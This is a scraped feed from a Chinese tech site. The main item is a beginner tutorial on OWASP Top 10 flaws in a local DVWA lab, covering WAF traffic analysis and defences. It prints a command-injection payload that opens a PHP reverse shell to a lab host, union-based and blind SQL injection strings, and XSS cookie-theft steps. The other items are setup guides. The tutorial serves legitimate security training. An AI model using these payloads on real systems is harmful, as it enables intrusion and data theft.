打开后的界面为：</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540102.html</guid><pubDate>Fri, 31 Oct 2025 07:24:12 +0000</pubDate></item><item><title>学习干货小白女友看完这篇文章后，面试工作和护网蓝队初级竟然秒通过！</title><link>https://www.ppmy.cn/news/1540103.html</link><description>小白女友看完这篇文章后，面试工作和护网蓝队初级竟然秒通过！
前言：本文中涉及到的相关技术或工具仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担，如有侵权请联系。
还在学怎么挖通用漏洞和src吗？快来加入学习交流
0x01 前言
本次环境以DVWA靶场(不太安全的网站)及CTF题目(夺旗赛)先对OWASP TOP10漏洞原理通俗概述，接着对基础代码解析，然后执行的命令落地到本地复现，前端进行复现后分析流量包，植入CTF题目，最后演示WAF流量经过，以及最高级别代码防护分析包括最终流程图，分析较为详细，对于初学者，网安爱好者及蓝队初级、运维等比较友好，在正常面试安全岗位时，也可能会问到理论问题，安全设备的了解，链路流量的走向，包括HVV蓝队初级最低也会问到常见攻击手法的理解和防护！
注：流程示意图以我本地网络层-应用层传输为例、并非现实通用
**结尾有流量包下载及全过程详细流程图(本地模拟)
**
Brute Force  (爆破)``Command Injection  (命令注入)``CSRF  (跨站请求伪造)``File Inclusion (文件包含)``File upload  (文件上传)``SQL Injection  (SQL注入)``SQL Injection (Blind)  (SQL盲注)``XSS  (反射型XSS)``CROSS XSS  (存储型XSS)
**如果您看完文章觉得不错，麻烦点个关注点个赞分享一下、谢谢！**
*** 本次学习环境为自行搭建，文章仅用于参考学习，请勿非法操作、后果自负
**
0x02 环境准备
**DVWA搭建-docker**
docker search dvwa # 我选的第一个``docker pull sagikazarmark/dvwa #下载到本地``docker run -it --restart -p 8001:80 sagikazarmark/dvwa #将此镜像启动容器并开机自启
WAF搭建-docker
https://waf-ce.chaitin.cn/docs/guide/install  #长亭雷池waf安装方法
各网卡及IP如下
192.168.150.1  #客户端IP``192.168.150.31:9443 #长亭WAF WEB管理页面``192.168.150.31:8001 #DVWA实际地址``192.168.150.31:90 #靶场映射WAF反向代理端口``192.168.150.2  # kali作为跳板机使用``内网：``172.17.0.1 #docker0网卡 docker虚拟网卡``172.17.0.2 #DVWA在docker内IP``172.22.222.1 #safeline-ce网卡 雷池waf虚拟网卡
CTF(夺旗赛)
通俗来说就是以实际环境中的事件或自发性自编环境，以题目的方式呈现给比赛者去做题。当比赛者通过漏洞或题目要求拿到flag(旗帜)的时候，就算成功，也就是这块的漏洞利用成功
0x03 思路解析
**Brute Force(野蛮的力量)**也称为爆破，拥有账号密码对相应的登录接口进行爆破、或根据网站规则及拿到的一些信息进行"撞库"危害：爆破成功后任意操作管理员或用户账号，如发送信息，后续渗透，获取敏感信息等
于是，我拿着他的SQL语句替换了user及pass然后进行查询
`SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';```select * from users where user='admin' and password='21232f297a57a5a743894a0e4a801fc3'; # 错误的密码```select * from `users` where user='admin' and password='5f4dcc3b5aa765d61d8327deb882cf99'; # 正确的密码`
前期代码解读完成，然后我们实操，直接burp抓包导入字典爆破
可以看到，当用户名为admin、密码为password的时候与其他包不一样，经过验证，账号密码就是这个，我们此时看抓取的流量包
可以看到，网站并没有进行相应的拦截
如何防守?
我们可以在WEB页面做一些限制``比如token，比如对请求IP限制，当然IP可以伪造``防止SQL注入，对传入数据进行处理``再或者就是账号密码错误3次后冻结多少分钟,前端输入密码后进行非对称加密等``安全设备就是对频率做限制，匹配字典规则满足后进行自动封禁
接着我们看waf，我给waf定义的规则是当10秒内请求次数高达100次的时候我们进行封禁IP10分钟，当然这个可以调
当我们发送请求包到200多的时候，包长度变了，不是密码错误包长也不是密码正确包长
这时候可以看到，WAF人机判断你的IP可能正在进行爆破或CC攻击，加载出验证码
我们这时候看后台数据，能看到客户端IP做的操作
我们拆解一下最高级别做了哪些防护
第3-5行做了一个token防止CSRF攻击``第8-16行对用户的输入做了处理，stripslashes函数去除输入的反斜杠等符号防止SQL注入，然后进行MD5加密``第19-27行先定义此用户的最大失败次数及锁定时间，然后SQL查询此用户是否已超过失败次数及是否超过锁定时间``第45-50行验证账号密码是否正确，":user"可以防止SQL注入，limit1只返回一条数据``第60行登录成功则返回该用户的头像并welcome``第64行后如果登录失败则提醒登录失败，然后加载2-4秒，防止爆破``接着就是对登录失败次数+1，然后对最后登录失败时间更新``生成一个新的token令牌，防止CSRF
**Command Injection (命令注入)**命令注入通俗来讲就是开发者对于某些功能需要调用系统命令去执行一些操作，或者是某些代码块因为逻辑上未知造成命令执行、再或者前端某些头部字段可能存在的注入点，而没有对客户端传入的数据进行过滤或固定，造成攻击者可以进行自定义传入命令或绕过传入命令的行为危害:攻击者拥有了命令执行后就相当于获得了服务器操作权限，攻击者可以根据漏点进行反弹shell以获取服务器shell，然后执行提权，植入后门或者其他危害性操作行为
按照正常业务引导，我们正常输入地址，回显出正常结果
而已知Linux分隔符，我们可以带入其他命令，看下图
可以看到我们使用分号进行分隔，执行了whoami命令，看到了www-data用户，将实际命令带入到Windows和Linux中看一下
接下来我们在网页输入以下命令在前端执行，获取服务器shell
kali: nc -lnvp 8888``网页: 127.0.0.1;php -r '$sock=fsockopen("192.168.150.2",8888);exec("sh &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'
在抓取的流量包内输入以下过滤条件看一下流量走向
ip.addr == 192.168.150.2 || ip.addr == 192.168.150.1 &amp;&amp; tcp.port != 22
**接下来我们看一道CTF题目**
如何防守?
可以进行关键字的过滤，对大小写的过滤，对符号的过滤，对编码的过滤``后端把此功能固定，前端只能输入相应的格式``在安全设备方面则从流量检测命令执行的特征``比如正常的win和Linux的命令，对于编码的检测，对于绕过方式的检测``如：双写，大小写，分隔符等
**对WAF进行测试**
为了清晰看到WAF流量经过，我们抓取了靶场和WAF的流量对比
在safeline_ce网卡流量包中``第一块大概就是网关传入流量，先进行初步过滤，然后容器向后推送``第二块就是对日志进行记录，比如请求包，payload，ID等``第三块就是入库操作，查询操作等
我们拆解一下最高级别做了哪些防护
第4-6行先接收传入进来的IP，接着生成一个TOken防止CSRF攻击``第9-10行将接收到的IP赋值给$target然后使用stripslashes函数过滤掉一些字符``第16-18行筛选八位字节是否为数字，验证是否为IP，接着将他重新组合为IP赋值给target``第21-28行进行正常ping命令操作，最后在根据相应结果输出``末尾重新生成一个Token
CSRF(跨站请求伪造)
通俗的来讲，某些操作如：更改密码，发布帖子，更新配置等操作，在非本意的情况下，点击了CSRF伪造的按钮功能，在用户已登录的情况下，未知进行的操作危害：主要目的是对WEB方面的用户及管理员用户进行的操作，比如通过钓鱼的方式诱导点击，对数据进行破坏，数据篡改等，更改用户密码后进行后续攻击等
接着我们按照自己的本意正常流程去修改密码
然后我们使用burp suite抓包生成一个CSRF的包，保存为html文件，在跳板机192.168.150.2开启一个http服务运行点击
这样看可能认为太俗了，但是实战中攻击者会美化页面比如copy钓鱼页面，诱导你点击，我们只是了解大概经过分析在kali中抓取的流量包以及dvwa抓取的流量包
由于CSRF大多按照Referer和origin来分辨，所以WAF在此拦截识别度不高，从代码块去增加校验可以
如何防护？
限制跨站请求，从标头进行限制``对敏感操作进行二次验证，比如验证码``使用CSRF令牌，即为Token``验证Refer头部，来源进行白名单验证
我们拆解一下最高级别做了哪些防护
第3-5行通过GET方式传入后，先生成一个Token令牌防止CSRF攻击``第8-10行接收传入进来的旧密码和新密码``第13-21行先进行过滤斜杠类的字符，然后对旧密码进行MD5加密前往数据库查询``第24-34行先验证输入的两次密码是否一样然后过滤掉反斜杠之类的字符``接着就算MD5加密后前往数据库更新，此处使用了实例化参数``接着将修改成功打印出来，反之修改失败``结尾不管是不是成功，重新生成一个CSRF的令牌
File Inclusion(文件包含)
文件包含比较容易理解，即某些功能或者文件，开发者需要读取，但是由于没有对读取文件范围固定，造成了攻击者可以进行任意文件读取或任意文件包含危害：攻击者得到任意文件读取漏洞后可以读取服务器上所有文件，以方便下一步的攻击渗透，或搭配文件上传组合拳或反弹shell组合拳等方式进行利用
这里不得不提几个常见的绕过方法，看下图
**如何防守?**
对读取文件固定如:(白名单)``if( $file != "include.php" &amp;&amp; $file != "file1.php" &amp;&amp; $file != "file2.php" &amp;&amp; $file != "file3.php" )``对传入协议进行限制(此处仅为限制远程文件读取)``对递归路径和编码做黑名单处理，或者白名单处理
**CTF题目环境**
**接着我们测试WAF的流量**
然后我们看一下后面的代码做了哪些限制
最高级8-11行做了固定文件，如果传入不是此文件名，则不通过``高级23-26行匹配是否"file"开头，如果file开头或者file参数为include.php则为真``此处使用file:///etc/passwd 仍然可以绕过``而中级38-39行只限制了http和https协议(远程文件读取)``以及递归目录的关键符号``这里仍然可以使用双写及多写的符号绕过
File Upload(文件上传)
通俗点讲就是某功能点，比如上传图片，上传表格，导入授权的功能，由于开发未进行严格过滤所需上传格式，造成攻击者可以进行修改文件格式、类型等任意文件上传，进行后期恶意利用，比如上传木马控制主机等危害：攻击者通过该漏洞类型上传木马文件后可远程控制主机，达到后期渗透、内网渗透的目的
从功能本意是需要上传图片，但是开发并没有做限制，攻击者可以随意上传任意文件**接着我们看一下下一个级别的文件上传**
**接着我们在看高级的文件上传代码**
我们此时使用以上方法生成一个图片马(这个在溯源的时候和CTF中的MISC有关系)
**如何防守?**
在代码块我们可以：``对文件扩展名前端进行检测后、上传至后端tmp后继续检测``对于文件类型到后端同样检测``对于文件大小限制苛刻``不返回文件路径``对文件名进行无规则重命名``在某些地方我们前端可以生成唯一session(从浏览器上传开始)一个session只能用一次``对于安全设备：``在流量中检测扩展名，文件类型，上传的路径``对于文件内容中的编码进行检测
**CTF题目**
**接着我们测试WAF的流量走向**
分析抓取的流量包(docker0 safeline-ce)
**我们看一下最高级代码做了哪些处理**
第一块3-5行接收来自前端POST上传，生成一个新的Token防止CSRF攻击``第二块9-13行对文件名、扩展名、文件大小、类型及临时文件路径预设参数``第三块16-20行设定了文件的路径，对文件重命名以MD5散列规则唯一ID，设定临时文件位置``第四块23-26行设定文件扩展名和文件大小为100kb，并且限制文件类型，这些都在后端去做``第五块28-37行验证为图片类型后将创建一个图片文件``并将图片文件压缩至100压缩等级为9``弟六块40-47行对临时目录文件重命名并移动至设定好的目录，然后回显
SQL Injection(SQL注入)
通俗来讲就是某功能，需要以ID或者姓名去到数据库查询信息，但是开发人员没有数据语句进行规范过滤，没有固定，攻击者可以以此SQL语句进行可控查询，从而获取更多的数据危害：攻击者通过SQL注入漏洞可以获取数据库内敏感信息，如账号密码、销售记录、存入的更敏感身份信息等、攻击者可以进行后续渗透，或者通过SQL注入配合其他方式漏洞进行写入文件，控制服务器等
我们拿着已知的语句替换掉id去查询，就是看到的结果
SELECT first_name, last_name FROM users WHERE user_id = '$id';``SELECT first_name, last_name FROM users WHERE user_id = '1';
其实我一直糊涂的是单引号的位置或者是为什么加单引号
因为开发前面定义了单引号，否则无单引号，我们也不需要加单引号了``SELECT first_name, last_name FROM users WHERE user_id = '1';``SELECT first_name, last_name FROM users WHERE user_id = '1' or '1=1';
前后正好为一个完整的SQL语句拼接，看下图就能明白了
输入1' order by 3 #去获取列，#为注释符，将我们输入后面的字符注释掉
当order by 2 #的时候将不在报错，所以为2列
再次执行1' union select 1,2# 此处可以看到列名
1' union select 1,group_concat(schema_name) from information_schema.schemata #`  `来获取所有数据库
这样看不直观，我们带入到数据库看一下
SELECT first_name, last_name FROM users WHERE user_id = '1' union select 1,group_concat(schema_name) from information_schema.schemata #  ;
1' union select 1,version() #获取版本信息``1' union select 1,database() # 获取当前使用数据库
1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #` `查询当前使用库的所有表
1' union select 1,group_concat(column_name) from information_schema.columns where table_name="users" #` `查询users表中的所有列
1' union select user,password from dvwa.users #` `前期步骤已知使用数据库名，表名，列名，直接union查询账号密码``带入到数据库查询``SELECT first_name, last_name FROM users WHERE user_id = '1' union select user,password from dvwa.users #
**如何防护?**
对查询语句参数化查询``最小化权限查询，权限分明``输入验证与过滤，对输入进来的字符大小写编码不合规pass``对特殊的所需字符进行白名单处理``对敏感的字符进行报错或重定向处理``安全设备方面``对流量监控，一般SQL语句进行pass，当然有些前端可能传输的语句可能会被误报``对某些字符：' " /**/ 等进行过滤``对传输进来的可疑编码进行检测后执行下一步动作
**CTF题目**
**接下来我们看WAF流量**
**我们接着分析最高级别源代码**
第3-5行判断GET传入进来ID查询参数，接着生成一个Token令牌，防止CSRF攻击``第11-16行判断传入进的ID是否为数字，然后执行查询语句，此处语句进行参数化并只输出1条``此处防止SQL注入``然后将查询的ID进行替换绑定``第19-25行先对数据判断是否为1行接着对查询的参数中first_name和last_name进行输出
SQL Injection (Blind) (SQL盲注)
SQL盲注通俗来讲：比如登录点或者是导出数据功能点，服务端需要和数据库交互来确定数据是否存在，存在返回ture，不存在返回false，盲注和正常注入区别就是，盲注不回显所需数据，攻击者只能通过某些函数如sleep，ASCII，substr等去判断数据是否存在危害：攻击者通过SQL注入漏洞可以获取数据库内敏感信息，如账号密码、销售记录、存入的更敏感身份信息等、攻击者可以进行后续渗透，或者通过SQL注入配合其他方式漏洞进行写入文件，控制服务器等
如：zhangsan这个数据存在，但是代码查询到了这个数据，由于功能的设置``zhangsan这个存在或不存在只能通过某些状态去显示，比如前端的账号存在或账号不存在``攻击者通过SQL语句构造payload进行sleep(延时)去判断``如数据存在则延时几秒不存在则不延时来达到攻击效果
这样看并不通透，我们看登录页面，当我第一次输入密码123456时``302重定向跳转到了登录页面，也就是前端查询到数据库内密码不匹配``但是它功能原因不会输出密码，最多告诉你密码不对或账号不对``然后第二次我们输入正确密码后302跳转到了index``也就是此次查验数据库内账号与密码全部符合
经过注入测试，发现存在注入点，且为字符型注入
使用 1' and length(database())=4#` `测试到4的时候，看到回显结果，使用数据库长度为4位
判断数据库第一位字符是字母还是数字以及区间``1' and ascii(substr(database(),1,1))&gt;97#``1' and ascii(substr(database(),1,1))&lt;122#``97的ASCII是a，122的ASCII是z，所以字母是小写
继续缩小范围，不嫌麻烦的话可跑脚本``1' and ascii(substr(database(),1,1))=100#``当ASCII码位100的时候，返回正确，其他返回错误``当然也可以使用大小于号去判断
继续执行语句``1' and ascii(substr(database(),2,1))=118#``1' and ascii(substr(database(),3,1))=119#``从第二个和第三个字符开始截取，分别截取1个字符``最终拼接得到数据库名为dvwa
输入以下语句后得到当前数据库中共有两张表``1' and (select count(table_name) from information_schema.tables where table_schema=database())=2#
1' and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=1#``此语句是查询当前数据库中的0和1个记录，就是查第一张表名的长度是否为1，limit限制查询条件``1' and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=9#``最终得到第一个表名长度为9
同样方法我们查询到第二个表长度为5``1' and length((select table_name from information_schema.tables where table_schema=database() limit 1,2))=5#
1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;97#``我们接着使用以上语句查询表名的第一个字母及后续字母进行拼``1' and (select count(column_name) from information_schema.columns where table_name='users')=2#``使用以上语句进行查询users表的列数量``1'  and length((select column_name from information_schema.columns where table_name='users' limit 0,1))=1 #``猜解users表的第一列的长度``1' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1)1,1))&lt;97#``猜解users表中的第一列的第一个字符修改数值查询后面字符``1' and ascii(substr((select user from users limit 0,1),1,1))&lt;97#``最终逐一猜解users表中的user和password字符
如何防护?
对查询语句参数化查询``最小化权限查询，权限分明``输入验证与过滤，对输入进来的字符大小写编码不合规pass``对特殊的所需字符进行白名单处理``对敏感的字符进行报错或重定向处理``安全设备方面``对流量监控，一般SQL语句进行pass，当然有些前端可能传输的语句可能会被误报``对某些字符：' " /**/ 等进行过滤``对传输进来的可疑编码进行检测后执行下一步动作
看一下WAF流量
**看一下最高级别源码**
第3-5行判断是否GET传参进来，然后生成一个Token来防止CSRF``第11-15行对传入进来的ID进行判断是否为数字``接着进行查询，此处用到参数化查询，防止SQL注入``并且Limit限制了只显示1条SQL数据``后面对查询id进行替换与绑定``第18-27行线对查询到的数据判断是否为1行接着进行输出``如果不是一行则报错，最后不管对与错再次刷新一个Token令牌
XSS (反射型)
通俗来讲，XSS是因为攻击者在网页中插入的JavaScript恶意脚本，而浏览器只会执行JavaScript并不会去理解是否为恶意，XSS较为常见，基本上在可输入点或者更改数据点中都可能存在XSS，如果开发不进行严格过滤，危害高  危害: XSS危害基本面向用户，比如：反射型XSS会窃取用户信息，cooki身份等，存储型XSS则会持久性停留，XSS还可以钓鱼，会话劫持等，有些攻击者还可通过XSS配合其他漏洞对服务器造成危害
我们在输入框内输入了张三，前端打印出hello，张三
当我们输入&lt;script&gt;alert(1)&lt;/script&gt;后，执行了JavaScript执行了弹窗，弹出1
我们继续利用CSRF配合XSS在用户未知的情况下窃取到cookie信息
准备：``XSS在线平台，用于获取用户cookie``跳板机，模拟钓鱼场景
如何防护？
对于用户的输入进行严格过滤``字符，编码，符号等进行过滤``在进行开发时不对用户输入的内容进行转义
然后我们看下WAF如何判断
**看一下最高级别代码做了什么**
第5-7行先判断传入进来的name以及是否为空``然后来一个Token防止CSRF``第10行 htmlspecialchars 函数将传入参数不进行转义``最后打印输出``第17行不论如何都重新生成一个Token
XSS(存储型)
存储型XSS的目的和反射型相同，只不过反射型需要攻击者主动攻击，而存储型攻击者只需插入代码后，利用功能特性，存入到数据库后，其他用户访问功能点时，即可达到被动攻击，一般出现在论坛、博客、或者某些特殊功能点
我正常输入了几个信息，并成功显示出了信息
于是我登录DVWA的其他用户看一下这些信息是否存在
其他用户账号信息``gordonb/abc123``1337/charley``pablo/letmein``smithy/password
然后我们模拟攻击者插入钓鱼XSS链接
插入恶意链接成功，由于JavaScript执行后是看不到正常代码的，我们查询一下mysql中的guestbook表
当有其他人访问的时候，前端因为会查询到guestbook表中指定信息，然后JavaScript自动执行XSS请求，完成无感被动恶意请求于是我们登录上其他用户名后再次查看在线XSS平台
这里一直出现问题，不知道是不是我网络问题，发不出去请求
如何防护？
对于用户的输入进行严格过滤``字符，编码，符号等进行过滤``在进行开发时不对用户输入的内容进行转义
由于存储型和反射型的区别是持久化和一次性的原因，目的一样，WAF拦截也是一样，这里不在抓取流量包分析，直接看最高级别代码
第一块判断POST传参进来，生成一个Token，防止CSRF``第二块先对接收到字段进行反斜杠等过滤，然后就是对对象的预处理``然后对输入的值不进行转义``23-26行插入数据做了参数化操作，然后对参数做替换和绑定``最后不论成功失败重新生成一个Token
0x04总结
耗时一周时间，从构建思路到复现环境，遇到问题解决问题，适用于网络安全运维人员，相关从业人员复习巩固，及学生未就业，即将面试及护网人员基础，对OWASP TOP10进行详细解析，对漏洞进行通俗概述及阐述危害，接着以DVWA为基础解析基础代码，然后带入本地服务器或数据库进行执行，通俗易懂，然后植入部分CTF题目理解，给出大概防护方法，最后分析WAF的流量经过进行对比，画出该漏洞的流程图(流程图仅适用于本地复现，具体以实际为准)基本围绕应用层-网络层进行流量交互，全文7000余字，全是干货，希望大佬勿喷，各位师傅互相交流讨论，麻烦一键三连，谢谢
文中拓补图仅供参考，异机和本机包括配置等整体拓扑不一致，只描绘流量经过
流量包下载：``https://ckxkzyk.lanzouo.com/iJW0o1ukf0mj
网络安全学习路线&amp;学习资源
网络安全的知识多而杂，怎么科学合理安排？
下面给大家总结了一套适用于网安零基础的学习路线，应届生和转行人员都适用，学完保底6k！就算你底子差，如果能趁着网安良好的发展势头不断学习，日后跳槽大厂、拿到百万年薪也不是不可能！
初级网工
1、网络安全理论知识（2天）
①了解行业相关背景，前景，确定发展方向。
②学习网络安全相关法律法规。
③网络安全运营的概念。
④等保简介、等保规定、流程和规范。
（非常重要）
2、渗透测试基础（一周）
①渗透测试的流程、分类、标准
②信息收集技术：主动/被动信息搜集、Nmap工具、Google Hacking
③漏洞扫描、漏洞利用、原理，利用方法、工具（MSF）、绕过IDS和反病毒侦察
④主机攻防演练：MS17-010、MS08-067、MS10-046、MS12-20等
3、操作系统基础（一周）
①Windows系统常见功能和命令
②Kali Linux系统常见功能和命令
③操作系统安全（系统入侵排查/系统加固基础）
4、计算机网络基础（一周）
①计算机网络基础、协议和架构
②网络通信原理、OSI模型、数据转发流程
③常见协议解析（HTTP、TCP/IP、ARP等）
④网络攻击技术与网络安全防御技术
⑤Web漏洞原理与防御：主动/被动攻击、DDOS攻击、CVE漏洞复现
5、数据库基础操作（2天）
①数据库基础
②SQL语言基础
③数据库安全加固
6、Web渗透（1周）
①HTML、CSS和JavaScript简介
②OWASP Top10
③Web漏洞扫描工具
④Web渗透工具：Nmap、BurpSuite、SQLMap、其他（菜刀、漏扫等）
恭喜你，如果学到这里，你基本可以从事一份网络安全相关的工作，比如渗透测试、Web 渗透、安全服务、安全分析等岗位；如果等保模块学的好，还可以从事等保工程师。薪资区间6k-15k
到此为止，大概1个月的时间。你已经成为了一名“脚本小子”。那么你还想往下探索吗？
【“脚本小子”成长进阶资源领取】
7、脚本编程（初级/中级/高级）
在网络安全领域。
是否具备编程能力是“脚本小子”和真正黑客的本质区别
。在实际的渗透测试过程中，面对复杂多变的网络环境，当常用工具不能满足实际需求的时候，往往需要对现有工具进行扩展，或者编写符合我们要求的工具、自动化脚本，这个时候就需要具备一定的编程能力。在分秒必争的CTF竞赛中，想要高效地使用自制的脚本工具来实现各种目的，更是需要拥有编程能力.
零基础入门，建议选择脚本语言Python/PHP/Go/Java中的一种，对常用库进行编程学习； 搭建开发环境和选择IDE,PHP环境推荐Wamp和XAMPP， IDE强烈推荐Sublime； ·Python编程学习，学习内容包含：语法、正则、文件、 网络、多线程等常用库，推荐《Python核心编程》，不要看完； ·用Python编写漏洞的exp,然后写一个简单的网络爬虫； ·PHP基本语法学习并书写一个简单的博客系统； 熟悉MVC架构，并试着学习一个PHP框架或者Python框架 (可选)； ·了解Bootstrap的布局或者CSS。
8、超级网工
这部分内容对零基础的同学来说还比较遥远，就不展开细说了，贴一个大概的路线。感兴趣的童鞋可以研究一下，不懂得地方可以【点这里】加我耗油，跟我学习交流一下。
网络安全工程师企业级学习路线
如图片过大被平台压缩导致看不清的话，可以【点这里】加我耗油发给你，大家也可以一起学习交流一下。
一些我自己买的、其他平台白嫖不到的视频教程：
需要的话可以扫描下方卡片加我耗油发给你（都是无偿分享的），大家也可以一起学习交流一下。
结语
网络安全产业就像一个江湖，各色人等聚集。相对于欧美国家基础扎实（懂加密、会防护、能挖洞、擅工程）的众多名门正派，我国的人才更多的属于旁门左道（很多白帽子可能会不服气），因此在未来的人才培养和建设上，需要调整结构，鼓励更多的人去做“正向”的、结合“业务”与“数据”、“自动化”的“体系、建设”，才能解人才之渴，真正的为社会全面互联网化提供安全保障。
特别声明：
此教程为纯技术分享！本书的目的决不是为那些怀有不良动机的人提供及技术支持！也不承担因为技术被滥用所产生的连带责任！本书的目的在于最大限度地唤醒大家对网络安全的重视，并采取相应的安全措施，从而减少由网络安全而带来的经济损失！！！</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540103.html</guid><pubDate>Fri, 31 Oct 2025 07:24:13 +0000</pubDate></item><item><title>如何查看GB28181流媒体平台LiveGBS对GB28181视频数据的统计信息</title><link>https://www.ppmy.cn/news/1540104.html</link><description>LiveGBS流媒体平台GB/T28181常见问题-如何快速查看推流上来的摄像头并停止摄像头推流？
1、负载信息
2、负载信息说明
3、会话列表查看
3.1、会话列表
4、停止会话
5、搭建GB28181视频直播平台
1、负载信息
实时展示直播、回放、播放、录像、H265、级联等使用数目
2、负载信息说明
直播：当前推流到平台的实时视频数目
回放：当前推流到平台的回放视频数目
播放：当前观看直播和回放的在线人数之和
录像：当前正在云端录像的通道数目
H265：当前推流到平台的视频中编码为H265的视频数目(含实时视频和回放视频)
级联：上级国标平台请求播放的视频数目(含实时视频和回放视频)
3、会话列表查看
点击柱状图可以查看
会话列表
3.1、会话列表
4、停止会话
会话列表里面有停止按钮，点击
停止
可以停止会话。
5、搭建GB28181视频直播平台
支持 Windows Linux 及其它CPU架构（国产、嵌入式…）操作系统
安装包下载 、 安装使用说明、 WEB前端源码</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540104.html</guid><pubDate>Fri, 31 Oct 2025 07:24:16 +0000</pubDate></item><item><title>搜维尔科技：力反馈遥操作解决方案，五指灵巧手遥操作解决方案</title><link>https://www.ppmy.cn/news/1540105.html</link><description>力反馈遥操作解决方案，五指灵巧手遥操作解决方案
搜维尔科技：力反馈遥操作解决方案，五指灵巧手遥操作解决方案</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540105.html</guid><pubDate>Fri, 31 Oct 2025 07:24:18 +0000</pubDate></item><item><title>分布式数据库环境（HBase分布式数据库）的搭建与配置</title><link>https://www.ppmy.cn/news/1540106.html</link><description>分布式数据库环境（HBase分布式数据库）的搭建与配置
1. VMWare安装CentOS7.9.2009
1.1 下载 CentOS7.9.2009 映像文件
1.2启动 VMware WorkstationPro，点击“创建新的虚拟机”
1.3在新建虚拟机向导界面选择“典型（推荐）”
1.4安装来源选择“安装程序光盘映像文件（iso）”，点击“浏览”按钮，选择下载的 centos7映像文件：CentOS-7-x86_64-Minimal-2009.iso
1.5指定虚拟机名称和位置（建议存储位置从默认的 C 盘改为其它盘）
1.6指定磁盘容量，可以使用推荐的 20GB
1.7点击“自定义硬件”，修改默认配置参数
1.8 VM 自动运行 CentOS7 映像文件，点击鼠标进入虚拟机，用键盘选中“Install CentOS7”，然后按回车键
1.9在 CentOS 7 的安装欢迎界面，选择安装语言为“简体中文”。
1.10设置“安装信息摘要”。
1.10.1 点击“安装位置”，在新窗口中，可以使用默认设置，直接点击左上角的“完成”按钮。
1.10.2点击“KDUMP”，在新窗口中取消“启用 kdump”后，点击左上角的“完成”按钮。
1.10.3点击“网络和主机名”，在新窗口中点击按钮打开以太网连接，在下方设置主机名为“centos7server”，并点击“应用”按钮，然后点击左上角的“完成”按钮。
1.10.4配置完毕，点击“开始安装”。在安装界面点击“ROOT 密码”，在新窗口中设置密码为：root，然后需要两次点击左上角的“完成按钮”，返回安装界面。
1.10.5等安装结束后，点击“重启”按钮。
1.10.6重启进入登陆界面，输入用户名 root，密码 root（输入密码时没有回显），即可成功登陆。
1.11系统设置
1.11.1修改网卡配置信息
2. 安装hadoop
2.1克隆一台虚拟机，设置网卡静态ip
2.2配置主机名
2.3安装jdk和Hadoop
2.4配置相关文件
2.5运行启动hadoop
3. 安装Hbase
3.1 准备安装文档。
3.2配置环境变量
3.3修改Hbase配置文件
3.4启动hbase。
4.总结
5.参考资料
1. VMWare安装CentOS7.9.2009
1.1 下载 CentOS7.9.2009 映像文件
下载网址：下载网址
1.2启动 VMware WorkstationPro，点击“创建新的虚拟机”
1.3在新建虚拟机向导界面选择“典型（推荐）”
1.4安装来源选择“安装程序光盘映像文件（iso）”，点击“浏览”按钮，选择下载的 centos7映像文件：CentOS-7-x86_64-Minimal-2009.iso
1.5指定虚拟机名称和位置（建议存储位置从默认的 C 盘改为其它盘）
1.6指定磁盘容量，可以使用推荐的 20GB
1.7点击“自定义硬件”，修改默认配置参数
设置内存为 4G，处理器为 2 核
移除打印机（选中打印机后，点击移除按钮）
配置完成后，点击“关闭”按钮。
回到新建虚拟机向导界面，点击“完成”按钮。
1.8 VM 自动运行 CentOS7 映像文件，点击鼠标进入虚拟机，用键盘选中“Install CentOS7”，然后按回车键
1.9在 CentOS 7 的安装欢迎界面，选择安装语言为“简体中文”。
1.10设置“安装信息摘要”。
1.10.1 点击“安装位置”，在新窗口中，可以使用默认设置，直接点击左上角的“完成”按钮。
1.10.2点击“KDUMP”，在新窗口中取消“启用 kdump”后，点击左上角的“完成”按钮。
1.10.3点击“网络和主机名”，在新窗口中点击按钮打开以太网连接，在下方设置主机名为“centos7server”，并点击“应用”按钮，然后点击左上角的“完成”按钮。
1.10.4配置完毕，点击“开始安装”。在安装界面点击“ROOT 密码”，在新窗口中设置密码为：root，然后需要两次点击左上角的“完成按钮”，返回安装界面。
1.10.5等安装结束后，点击“重启”按钮。
1.10.6重启进入登陆界面，输入用户名 root，密码 root（输入密码时没有回显），即可成功登陆。
1.11系统设置
1.11.1修改网卡配置信息
查看当前ip地址
切换工作目录：cd /etc/sysconfig/network-scripts/
编辑网卡文件：vi ifcfg-ens33
默认为命令模式，无法修改文件内容，按下字母“i”进入编辑模式，修改内容如下：
修改完毕后，按“ESC”键进入命令模式，输入“:wq”保存退出
重启网卡：systemctl restart network
检查网络是否连通：ping www.baidu.com
显示如下结果，说明网络正常，按 Ctrl+C 退出执行：
关闭防火墙：systemctl disable firewalld
关闭 selinux：sed -i ‘s/enforcing/disabled/’ /etc/selinux/config
重启：reboot
2. 安装hadoop
2.1克隆一台虚拟机，设置网卡静态ip
• cd /etc/sysconfig/network-scripts
• 编辑网卡文件：vi ifcfg-ens33
• 将IPADDR的值修改为192.168.37.182（其它配置不变）。
• 保存后，执行systemctl restart network，即可重启网卡，使设置生效
• 运行ping www.baidu.com检查网络是否连通。
2.2配置主机名
• 在虚拟机hadp01上编辑hostname文件vi /etc/hostname,修改文件内容为：hadp01
• 编辑hadp01的hosts文件vi /etc/hosts。
加以下内容：192.168.3.182 hadp02
• 在虚拟机的hosts文件中增运行reboot重启CentOS系统，使设置生效
2.3安装jdk和Hadoop
• 在官网下载文件：jdk-8u201-linux-x64.tar.gz和hadoop-2.9.2.tar.gz，通过MobaXterm，将保存在Win10中的jdk-8u201-linux-x64.tar.gz和hadoop-2.9.2.tar.gz传递到hadp01的/home/root目录中，并解压到执行命令tar -xzvf jdk-8u201-linux-x64.tar.gz -C apps/，tar -xzvf hadoop-2.9.2.tar.gz -C apps/， 将jdk解压到指定目录中(/home/root/apps)。
• vi /etc/profile 编辑/etc/profile文件，在文件的末尾设置JAVA环境变量
2.4配置相关文件
